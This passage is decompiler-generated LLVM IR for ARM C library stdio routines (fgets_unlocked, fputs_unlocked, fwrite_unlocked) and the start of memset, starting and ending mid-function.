  %stack_var_-60.1.in = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_11750 ]
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_11774 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 112) to i32*), align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_11780 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v4_11774, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11780)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_117a4 = load i32, i32* %sb.global-to-local, align 4
  %v2_117a4 = add i32 %v0_117a4, 16
  %v3_117a4 = inttoptr i32 %v2_117a4 to i32*
  %v4_117a4 = load i32, i32* %v3_117a4, align 4
  call void @__pseudo_branch(i32 %v4_117a4)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_117b4 = add i32 %v0_117a4, 12
  %v3_117b4 = inttoptr i32 %v2_117b4 to i32*
  %v4_117b4 = load i32, i32* %v3_117b4, align 4
  store i32 %v4_117b4, i32* %r2.global-to-local, align 4
  %v1_117b8 = inttoptr i32 %v4_117b4 to i32*
  %v2_117b8 = load i32, i32* %v1_117b8, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_117c0 = add i32 %v2_117b8, 1
  store i32 %v1_117c0, i32* %r3.global-to-local, align 4
  %v2_117c4 = add i32 %v0_117a4, 24
  %v3_117c4 = inttoptr i32 %v2_117c4 to i32*
  %v4_117c4 = load i32, i32* %v3_117c4, align 4
  store i32 %v1_117c0, i32* %v1_117b8, align 4
  call void @__pseudo_branch(i32 %v4_117c4)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_117e0 = load i32, i32* %sb.global-to-local, align 4
  %v2_117e0 = add i32 %v0_117e0, 100
  %v3_117e0 = inttoptr i32 %v2_117e0 to i32*
  %v4_117e0 = load i32, i32* %v3_117e0, align 4
  store i32 %v4_117e0, i32* @r4, align 4
  store i32 %v4_117e0, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11780)
  call void @__pseudo_branch(i32 %v4_117a4)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_11808 = load i32, i32* %sb.global-to-local, align 4
  %v2_11808 = add i32 %v0_11808, 48
  %v3_11808 = inttoptr i32 %v2_11808 to i32*
  %v4_11808 = load i32, i32* %v3_11808, align 4
  store i32 %v4_11808, i32* %r3.global-to-local, align 4
  %v1_11814 = inttoptr i32 %v4_11808 to i32*
  %v2_11814 = load i32, i32* %v1_11814, align 4
  store i32 %v2_11814, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_117c4)
  %v0_11820 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_11820, i32* @r6, align 4
  %v2_11824 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_11824, i32* @r8, align 4
  store i32 76, i32* %fp.global-to-local, align 4
  %v0_118b8.pr = load i32, i32* @r7, align 4
  %v2_118b820 = icmp eq i32 %v0_118b8.pr, 0
  br i1 %v2_118b820, label %dec_label_pc_118c0, label %dec_label_pc_1182c

dec_label_pc_1182c:                               ; preds = %dec_label_pc_11760, %dec_label_pc_118b4
  %v0_11838 = phi i32 [ %v3_118b4, %dec_label_pc_118b4 ], [ %v0_118b8.pr, %dec_label_pc_11760 ]
  %v1_1182c = inttoptr i32 %v0_11838 to i16*
  %v2_1182c = load i16, i16* %v1_1182c, align 2
  %v3_1182c = zext i16 %v2_1182c to i32
  store i32 %v3_1182c, i32* %r3.global-to-local, align 4
  %v1_11830 = and i32 %v3_1182c, 64
  %v2_11830 = icmp eq i32 %v1_11830, 0
  br i1 %v2_11830, label %dec_label_pc_118b4, label %dec_label_pc_11838

dec_label_pc_11838:                               ; preds = %dec_label_pc_1182c
  %v1_11838 = add i32 %v0_11838, 56
  store i32 %v1_11838, i32* @r4, align 4
  store i32 %v1_11838, i32* %r2.global-to-local, align 4
  %v0_11848 = load i32, i32* %sb.global-to-local, align 4
  %v1_11848 = load i32, i32* %fp.global-to-local, align 4
  %v2_11848 = add i32 %v1_11848, %v0_11848
  %v3_11848 = inttoptr i32 %v2_11848 to i32*
  %v4_11848 = load i32, i32* %v3_11848, align 4
  call void @__pseudo_branch(i32 %v4_11848)
  %v1_11858 = load i32, i32* @r8, align 4
  %v2_11858 = add i32 %v1_11858, %v0_11848
  %v3_11858 = inttoptr i32 %v2_11858 to i32*
  %v4_11858 = load i32, i32* %v3_11858, align 4
  call void @__pseudo_branch(i32 %v4_11858)
  %v0_11864 = load i32, i32* @r7, align 4
  %v1_11864 = inttoptr i32 %v0_11864 to i16*
  %v2_11864 = load i16, i16* %v1_11864, align 2
  %v3_11864 = zext i16 %v2_11864 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_1186c = or i32 %v3_11864, %stack_var_-60.1.in
  %v1_11870 = xor i32 %v2_1186c, 320
  store i32 %v1_11870, i32* %r3.global-to-local, align 4
  %v1_11874 = and i32 %v1_11870, 832
  %v2_11874 = icmp eq i32 %v1_11874, 0
  br i1 %v2_11874, label %dec_label_pc_1187c, label %bb39

dec_label_pc_1187c:                               ; preds = %dec_label_pc_11838
  store i32 %v0_11864, i32* @r0, align 4
  %v0_11880 = call i32 @__stdio_wcommit()
  %v2_11884 = icmp eq i32 %v0_11880, 0
  br i1 %v2_11884, label %.thread8, label %.thread9

.thread8:                                         ; preds = %dec_label_pc_1187c
  %v1_11888 = load i32, i32* @r7, align 4
  %v2_11888 = inttoptr i32 %v1_11888 to i16*
  %v3_11888 = load i16, i16* %v2_11888, align 2
  %v4_11888 = zext i16 %v3_11888 to i32
  store i32 %v4_11888, i32* %r3.global-to-local, align 4
  %v2_1188c = add i32 %v1_11888, 8
  %v3_1188c = inttoptr i32 %v2_1188c to i32*
  %v4_1188c = load i32, i32* %v3_1188c, align 4
  store i32 %v4_1188c, i32* %r2.global-to-local, align 4
  %v2_11890 = and i32 %v4_11888, 65471
  store i32 %v2_11890, i32* %r3.global-to-local, align 4
  %v3_11894 = add i32 %v1_11888, 28
  %v4_11894 = inttoptr i32 %v3_11894 to i32*
  store i32 %v4_1188c, i32* %v4_11894, align 4
  %v1_11898 = load i32, i32* %r3.global-to-local, align 4
  %v2_11898 = trunc i32 %v1_11898 to i16
  %v3_11898 = load i32, i32* @r7, align 4
  %v4_11898 = inttoptr i32 %v3_11898 to i16*
  store i16 %v2_11898, i16* %v4_11898, align 2
  br label %bb39

.thread9:                                         ; preds = %dec_label_pc_1187c
  store i32 -1, i32* @r6, align 4
  br label %bb39

bb39:                                             ; preds = %.thread8, %dec_label_pc_11838, %.thread9
  %v0_118a8 = load i32, i32* %sb.global-to-local, align 4
  %v1_118a8 = load i32, i32* %sl.global-to-local, align 4
  %v2_118a8 = add i32 %v1_118a8, %v0_118a8
  %v3_118a8 = inttoptr i32 %v2_118a8 to i32*
  %v4_118a8 = load i32, i32* %v3_118a8, align 4
  call void @__pseudo_branch(i32 %v4_118a8)
  %v0_118b4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_118b4

dec_label_pc_118b4:                               ; preds = %dec_label_pc_1182c, %bb39
  %v0_118b4 = phi i32 [ %v0_11838, %dec_label_pc_1182c ], [ %v0_118b4.pre, %bb39 ]
  %v1_118b4 = add i32 %v0_118b4, 32
  %v2_118b4 = inttoptr i32 %v1_118b4 to i32*
  %v3_118b4 = load i32, i32* %v2_118b4, align 4
  store i32 %v3_118b4, i32* @r7, align 4
  %v2_118b8 = icmp eq i32 %v3_118b4, 0
  br i1 %v2_118b8, label %dec_label_pc_118c0, label %dec_label_pc_1182c

dec_label_pc_118c0:                               ; preds = %dec_label_pc_118b4, %dec_label_pc_11760
  %v0_118c0 = call i32 @_stdio_openlist_dec_use()
  %v0_118fc.pre = load i32, i32* @r6, align 4
  br label %bb41

dec_label_pc_118c8:                               ; preds = %dec_label_pc_11750
  %v2_118c8 = load i16, i16* %arg1, align 2
  %v3_118c8 = zext i16 %v2_118c8 to i32
  %v1_118cc = and i32 %v3_118c8, 64
  store i32 %v1_118cc, i32* %r3.global-to-local, align 4
  %v2_118cc = icmp eq i32 %v1_118cc, 0
  br i1 %v2_118cc, label %bb40, label %dec_label_pc_118d8

bb40:                                             ; preds = %dec_label_pc_118c8
  br label %bb41

dec_label_pc_118d8:                               ; preds = %dec_label_pc_118c8
  %v0_118d8 = call i32 @__stdio_wcommit()
  %v2_118dc = icmp eq i32 %v0_118d8, 0
  br i1 %v2_118dc, label %.thread16, label %.thread18

.thread18:                                        ; preds = %dec_label_pc_118d8
  br label %bb41

.thread16:                                        ; preds = %dec_label_pc_118d8
  %v1_118e0 = load i32, i32* %fp.global-to-local, align 4
  %v2_118e0 = inttoptr i32 %v1_118e0 to i16*
  %v3_118e0 = load i16, i16* %v2_118e0, align 2
  %v4_118e0 = zext i16 %v3_118e0 to i32
  store i32 %v4_118e0, i32* %r3.global-to-local, align 4
  %v2_118e4 = add i32 %v1_118e0, 8
  %v3_118e4 = inttoptr i32 %v2_118e4 to i32*
  %v4_118e4 = load i32, i32* %v3_118e4, align 4
  store i32 %v4_118e4, i32* %r2.global-to-local, align 4
  %v2_118e8 = and i32 %v4_118e0, 65471
  store i32 %v2_118e8, i32* %r3.global-to-local, align 4
  %v2_118ec = trunc i32 %v2_118e8 to i16
  store i16 %v2_118ec, i16* %v2_118e0, align 2
  %v1_118f0 = load i32, i32* %r2.global-to-local, align 4
  %v2_118f0 = load i32, i32* %fp.global-to-local, align 4
  %v3_118f0 = add i32 %v2_118f0, 28
  %v4_118f0 = inttoptr i32 %v3_118f0 to i32*
  store i32 %v1_118f0, i32* %v4_118f0, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread18, %dec_label_pc_118c0, %.thread16
  %v0_118fc = phi i32 [ -1, %.thread18 ], [ 0, %bb40 ], [ %v0_118fc.pre, %dec_label_pc_118c0 ], [ 0, %.thread16 ]
  ret i32 %v0_118fc

; uselistorder directives
  uselistorder i32 %v3_118b4, { 1, 2, 0 }
  uselistorder i32 %v0_117a4, { 1, 0, 2 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 112) to i32*), { 1, 2, 0 }
  uselistorder label %bb41, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_118b4, { 1, 0 }
  uselistorder label %bb39, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1182c, { 1, 0 }
  uselistorder label %dec_label_pc_11760, { 1, 0 }
}

define i32 @function_11910(i32 %arg1) local_unnamed_addr {
dec_label_pc_11910:
  %v0_11910 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11910, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_11910
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_11910, %bb
  %v5_1192c = phi i32 [ %arg1, %dec_label_pc_11910 ], [ 0, %bb ]
  ret i32 %v5_1192c

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_11930 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11934 = icmp eq i32 %arg2, 0
  store i1 %v2_11934, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_119bc, label %dec_label_pc_119a4.preheader

dec_label_pc_119a4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_119a42 = add i32 %arg2, -1
  store i32 %v1_119a42, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_119a48 = icmp eq i32 %arg2, 1
  store i1 %v7_119a48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_119a48, label %dec_label_pc_119ac, label %dec_label_pc_11950

dec_label_pc_11950:                               ; preds = %dec_label_pc_119a4.preheader, %dec_label_pc_119a4.backedge.dec_label_pc_11950_crit_edge
  %v0_11974 = phi i32 [ %v0_11950.pre, %dec_label_pc_119a4.backedge.dec_label_pc_11950_crit_edge ], [ %arg3, %dec_label_pc_119a4.preheader ]
  %v1_11950 = add i32 %v0_11974, 16
  %v2_11950 = inttoptr i32 %v1_11950 to i32*
  %v3_11950 = load i32, i32* %v2_11950, align 4
  store i32 %v3_11950, i32* %r2.global-to-local, align 4
  %v1_11954 = add i32 %v0_11974, 24
  %v2_11954 = inttoptr i32 %v1_11954 to i32*
  %v3_11954 = load i32, i32* %v2_11954, align 4
  store i32 %v3_11954, i32* %r3.global-to-local, align 4
  %v3_11958 = icmp uge i32 %v3_11950, %v3_11954
  store i1 %v3_11958, i1* %cpsr_c.global-to-local, align 1
  %v9_11958 = icmp eq i32 %v3_11950, %v3_11954
  store i1 %v9_11958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11958, label %dec_label_pc_11974, label %dec_label_pc_11960

dec_label_pc_11960:                               ; preds = %dec_label_pc_11950
  %v1_11960 = inttoptr i32 %v3_11950 to i8*
  %v2_11960 = load i8, i8* %v1_11960, align 1
  %v3_11960 = zext i8 %v2_11960 to i32
  store i32 %v3_11960, i32* %r3.global-to-local, align 4
  %v5_11960 = add i32 %v3_11950, 1
  store i32 %v5_11960, i32* %r2.global-to-local, align 4
  %v2_11964 = load i32, i32* @r5, align 4
  %v3_11964 = inttoptr i32 %v2_11964 to i8*
  store i8 %v2_11960, i8* %v3_11964, align 1
  %v4_11964 = load i32, i32* @r5, align 4
  %v5_11964 = add i32 %v4_11964, 1
  store i32 %v5_11964, i32* @r5, align 4
  %v0_11968 = load i32, i32* %r3.global-to-local, align 4
  %v2_11968 = icmp ugt i32 %v0_11968, 9
  store i1 %v2_11968, i1* %cpsr_c.global-to-local, align 1
  %v7_11968 = icmp eq i32 %v0_11968, 10
  store i1 %v7_11968, i1* %cpsr_z.global-to-local, align 1
  %v0_1196c = load i32, i32* %r2.global-to-local, align 4
  %v1_1196c = load i32, i32* @r4, align 4
  %v2_1196c = add i32 %v1_1196c, 16
  %v3_1196c = inttoptr i32 %v2_1196c to i32*
  store i32 %v0_1196c, i32* %v3_1196c, align 4
  br i1 %v7_11968, label %dec_label_pc_119ac, label %dec_label_pc_119a4.backedge

dec_label_pc_11974:                               ; preds = %dec_label_pc_11950
  %v1_11974 = inttoptr i32 %v0_11974 to i16*
  %v3_11978 = call i32 @getc_unlocked(i16* %v1_11974)
  %v3_1197c = icmp eq i32 %v3_11978, -1
  store i1 %v3_1197c, i1* %cpsr_c.global-to-local, align 1
  %v8_1197c = icmp eq i32 %v3_11978, -1
  store i1 %v8_1197c, i1* %cpsr_z.global-to-local, align 1
  %v1_11980 = urem i32 %v3_11978, 256
  store i32 %v1_11980, i32* %r3.global-to-local, align 4
  br i1 %v3_1197c, label %dec_label_pc_11988, label %dec_label_pc_119a0

dec_label_pc_11988:                               ; preds = %dec_label_pc_11974
  %v0_11988 = load i32, i32* @r4, align 4
  %v1_11988 = inttoptr i32 %v0_11988 to i16*
  %v2_11988 = load i16, i16* %v1_11988, align 2
  %v3_11988 = zext i16 %v2_11988 to i32
  store i32 %v3_11988, i32* %r3.global-to-local, align 4
  %v1_1198c = and i32 %v3_11988, 8
  %v2_1198c = icmp eq i32 %v1_1198c, 0
  store i1 %v2_1198c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1198c, label %dec_label_pc_119ac, label %dec_label_pc_119bc

dec_label_pc_119a0:                               ; preds = %dec_label_pc_11974
  %v1_11998 = trunc i32 %v3_11978 to i8
  %v2_11998 = load i32, i32* @r5, align 4
  %v3_11998 = inttoptr i32 %v2_11998 to i8*
  store i8 %v1_11998, i8* %v3_11998, align 1
  %v4_11998 = load i32, i32* @r5, align 4
  %v5_11998 = add i32 %v4_11998, 1
  store i32 %v5_11998, i32* @r5, align 4
  %v0_1199c = load i32, i32* %r3.global-to-local, align 4
  %v2_1199c = icmp ugt i32 %v0_1199c, 9
  store i1 %v2_1199c, i1* %cpsr_c.global-to-local, align 1
  %v7_1199c = icmp eq i32 %v0_1199c, 10
  store i1 %v7_1199c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1199c, label %dec_label_pc_119ac, label %dec_label_pc_119a4.backedge

dec_label_pc_119a4.backedge:                      ; preds = %dec_label_pc_119a0, %dec_label_pc_11960
  %v0_119a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_119a4 = add i32 %v0_119a4, -1
  store i32 %v1_119a4, i32* %r6.global-to-local, align 4
  %v2_119a4 = icmp ne i32 %v0_119a4, 0
  store i1 %v2_119a4, i1* %cpsr_c.global-to-local, align 1
  %v7_119a4 = icmp eq i32 %v0_119a4, 1
  store i1 %v7_119a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_119a4, label %dec_label_pc_119ac, label %dec_label_pc_119a4.backedge.dec_label_pc_11950_crit_edge

dec_label_pc_119a4.backedge.dec_label_pc_11950_crit_edge: ; preds = %dec_label_pc_119a4.backedge
  %v0_11950.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11950

dec_label_pc_119ac:                               ; preds = %dec_label_pc_119a0, %dec_label_pc_119a4.backedge, %dec_label_pc_11960, %dec_label_pc_119a4.preheader, %dec_label_pc_11988
  %v0_119ac = load i32, i32* @r5, align 4
  %v1_119ac = load i32, i32* @r7, align 4
  %v3_119ac = icmp uge i32 %v0_119ac, %v1_119ac
  store i1 %v3_119ac, i1* %cpsr_c.global-to-local, align 1
  %v9_119ac = icmp eq i32 %v0_119ac, %v1_119ac
  store i1 %v9_119ac, i1* %cpsr_z.global-to-local, align 1
  %v2_119b0 = xor i1 %v9_119ac, true
  %v3_119b0 = and i1 %v3_119ac, %v2_119b0
  br i1 %v3_119b0, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_119ac
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_119b4 = inttoptr i32 %v0_119ac to i8*
  store i8 0, i8* %v7_119b4, align 1
  %v0_119b8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_119b8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_119ac, %bb
  %v1_119b8 = phi i1 [ %v1_119b8.pre, %bb ], [ %v9_119ac, %dec_label_pc_119ac ]
  %v0_119b8 = phi i1 [ %v0_119b8.pre, %bb ], [ %v3_119ac, %dec_label_pc_119ac ]
  %v2_119b8 = xor i1 %v1_119b8, true
  %v3_119b8 = and i1 %v0_119b8, %v2_119b8
  br i1 %v3_119b8, label %.dec_label_pc_119c0_crit_edge, label %dec_label_pc_119bc

.dec_label_pc_119c0_crit_edge:                    ; preds = %.thread14
  %v0_119c0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_119c0

dec_label_pc_119bc:                               ; preds = %entry, %dec_label_pc_11988, %.thread14
  br label %dec_label_pc_119c0

dec_label_pc_119c0:                               ; preds = %.dec_label_pc_119c0_crit_edge, %dec_label_pc_119bc
  %v0_119c0 = phi i32 [ %v0_119c0.pre, %.dec_label_pc_119c0_crit_edge ], [ 0, %dec_label_pc_119bc ]
  store i32 %v6_11930, i32* @r5, align 4
  ret i32 %v0_119c0

; uselistorder directives
  uselistorder i1 %v9_119ac, { 1, 0, 2 }
  uselistorder i32 %v1_119ac, { 1, 0 }
  uselistorder i32 %v0_119ac, { 0, 2, 1 }
  uselistorder i32 %v0_119a4, { 2, 0, 1 }
  uselistorder i32 %v0_1199c, { 1, 0 }
  uselistorder i32 %v3_11978, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11968, { 1, 0 }
  uselistorder i32 %v3_11950, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_11974, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_119c0, { 1, 0 }
  uselistorder label %dec_label_pc_119bc, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_119ac, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_11950, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_119d0 = load i32, i32* @r4, align 4
  store i32 %v3_119d0, i32* %stack_var_-16, align 4
  %v6_119d0 = load i32, i32* @r5, align 4
  %v9_119d0 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_119dc = call i32 @strlen(i8* %arg1)
  store i32 %v3_119dc, i32* @r6, align 4
  %v0_119e4 = load i32, i32* @r5, align 4
  %v0_119e8 = load i32, i32* @r4, align 4
  %v5_119f4 = inttoptr i32 %v0_119e4 to i16*
  %v6_119f4 = call i32 @__GI_fwrite_unlocked(i32 %v0_119e8, i32 1, i32 %v3_119dc, i16* %v5_119f4)
  %v1_119f8 = load i32, i32* @r6, align 4
  %v9_119f8 = icmp eq i32 %v6_119f4, %v1_119f8
  br i1 %v9_119f8, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_11a04 = phi i32 [ %v6_119f4, %entry ], [ -1, %bb ]
  %v2_11a00 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11a00, i32* @r4, align 4
  store i32 %v6_119d0, i32* @r5, align 4
  store i32 %v9_119d0, i32* @r6, align 4
  ret i32 %v1_11a04

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_11a08 = load i32, i32* @r6, align 4
  %v12_11a08 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_11a10 = load i16, i16* %arg4, align 2
  %v1_11a14 = and i16 %v3_11a10, 192
  %v2_11a18 = icmp eq i16 %v1_11a14, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_11a18, label %dec_label_pc_11a44, label %dec_label_pc_11a30

dec_label_pc_11a30:                               ; preds = %entry
  %v4_11a38 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_11a3c = icmp eq i32 %v4_11a38, 0
  br i1 %v2_11a3c, label %dec_label_pc_11a44thread-pre-split, label %dec_label_pc_11aa4

dec_label_pc_11a44thread-pre-split:               ; preds = %dec_label_pc_11a30
  %v0_11a44.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_11a44

dec_label_pc_11a44:                               ; preds = %dec_label_pc_11a44thread-pre-split, %entry
  %v0_11a68 = phi i32 [ %v0_11a44.pr, %dec_label_pc_11a44thread-pre-split ], [ %arg2, %entry ]
  %v2_11a44 = icmp eq i32 %v0_11a68, 0
  br i1 %v2_11a44, label %dec_label_pc_11aa4, label %bb

bb:                                               ; preds = %dec_label_pc_11a44
  %v1_11a48 = load i32, i32* @r6, align 4
  %v3_11a48 = icmp eq i32 %v1_11a48, 0
  br i1 %v3_11a48, label %dec_label_pc_11aa4, label %dec_label_pc_11a50

dec_label_pc_11a50:                               ; preds = %bb
  %v2_11a58 = udiv i32 -1, %v0_11a68
  %tmp9 = icmp ugt i32 %v1_11a48, %v2_11a58
  %v0_11a84 = load i32, i32* @r5, align 4
  %v1_11a84 = inttoptr i32 %v0_11a84 to i16*
  br i1 %tmp9, label %dec_label_pc_11a84, label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a50
  store i32 %v0_11a84, i32* %r2.global-to-local, align 4
  %v2_11a68 = mul i32 %v1_11a48, %v0_11a68
  %v0_11a6c = load i32, i32* @r7, align 4
  %v5_11a70 = call i32 @__stdio_fwrite(i32 %v0_11a6c, i32 %v2_11a68, i16* %v1_11a84)
  %v0_11a74 = load i32, i32* @r4, align 4
  %v2_11a78 = udiv i32 %v5_11a70, %v0_11a74
  store i32 %v2_11a78, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11aa8

dec_label_pc_11a84:                               ; preds = %dec_label_pc_11a50
  %v2_11a84 = load i16, i16* %v1_11a84, align 2
  %v1_11a88 = or i16 %v2_11a84, 8
  store i16 %v1_11a88, i16* %v1_11a84, align 2
  %v0_11a90 = call i32 @__GI___errno_location()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_11a9c = inttoptr i32 %v0_11a90 to i32*
  store i32 22, i32* %v2_11a9c, align 4
  %v0_11aa8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11aa8

dec_label_pc_11aa4:                               ; preds = %dec_label_pc_11a44, %dec_label_pc_11a30, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11aa8

dec_label_pc_11aa8:                               ; preds = %dec_label_pc_11a84, %dec_label_pc_11a64, %dec_label_pc_11aa4
  %v0_11aa8 = phi i32 [ %v0_11aa8.pre, %dec_label_pc_11a84 ], [ %v2_11a78, %dec_label_pc_11a64 ], [ 0, %dec_label_pc_11aa4 ]
  store i32 %v9_11a08, i32* @r6, align 4
  store i32 %v12_11a08, i32* @r7, align 4
  ret i32 %v0_11aa8

; uselistorder directives
  uselistorder i16* %v1_11a84, { 0, 2, 1 }
  uselistorder i32 %v1_11a48, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_11aa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11aa4, { 2, 0, 1 }
}

define i32 @function_11ab8(i32 %arg1) local_unnamed_addr {
dec_label_pc_11ab8:
  ret i32 %arg1
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_11ac4 = load i32, i32* @r2, align 4
  %v8_11ac4 = icmp eq i32 %v0_11ac4, 8
  store i1 %v8_11ac4, i1* %cpsr_z.global-to-local, align 1
  %v5_11ac8 = icmp slt i32 %v0_11ac4, 8
  br i1 %v5_11ac8, label %dec_label_pc_11b28, label %dec_label_pc_11acc

dec_label_pc_11acc:                               ; preds = %entry
  %v4_11acc = mul i32 %arg2, 256
  %v5_11acc = or i32 %v4_11acc, %arg2
  %v4_11ad0 = mul i32 %v5_11acc, 65536
  %v5_11ad0 = or i32 %v4_11ad0, %v5_11acc
  store i32 %v5_11ad0, i32* %r1.global-to-local, align 4
  %v1_11ad457 = urem i32 %tmp, 4
  %v2_11ad458 = icmp eq i32 %v1_11ad457, 0
  store i1 %v2_11ad458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_11ad458, label %dec_label_pc_11ae4, label %bb

bb:                                               ; preds = %dec_label_pc_11acc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_11acc ]
  %v3_11ad859 = phi i32 [ %v6_11ad8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_11acc ]
  %v4_11ad8 = inttoptr i32 %v3_11ad859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11ad8, align 1
  %v5_11ad8 = load i32, i32* @r3, align 4
  %v6_11ad8 = add i32 %v5_11ad8, 1
  store i32 %v6_11ad8, i32* @r3, align 4
  %v0_11adc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11ae8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_11adc.pr, label %dec_label_pc_11ae4, label %.thread

.thread:                                          ; preds = %bb
  %v2_11adc = add i32 %v0_11ae8.pr.pre, -1
  store i32 %v2_11adc, i32* @r2, align 4
  %v1_11ad4 = urem i32 %v6_11ad8, 4
  %v2_11ad4 = icmp eq i32 %v1_11ad4, 0
  store i1 %v2_11ad4, i1* %cpsr_z.global-to-local, align 1
